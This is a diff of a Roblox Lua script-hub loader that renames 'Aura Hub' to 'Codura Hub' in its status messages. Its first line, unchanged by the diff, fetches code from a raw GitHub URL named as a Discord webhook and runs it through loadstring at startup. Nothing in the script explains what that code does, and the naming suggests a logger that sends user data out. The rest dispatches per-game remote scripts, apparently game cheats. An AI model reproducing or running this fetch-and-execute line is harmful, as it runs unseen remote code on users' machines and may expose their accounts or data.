@@ -1,7 +1,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/aurahubalpha/Webhook/refs/heads/main/DMTinyskullrblxOnDiscordForFreewebhook",true))()
 
 local GameID = game.PlaceId
-print("🎮 Aura Hub is starting up...")
+print("🎮 Codura Hub is starting up...")
 print("🧾 Detected Game ID:", GameID)
 
 -- 🗂️ Game Library
@@ -45,5 +45,5 @@ if Games[GameID] then
 	Games[GameID]() -- Run its loadstring
 else
 	warn("❌ Unsupported Game ID:", GameID)
-	print("🪐 This game isn’t in Aura Hub’s supported list yet.")
+	print("🪐 This game isn’t in Codura Hub’s supported list yet.")
 end
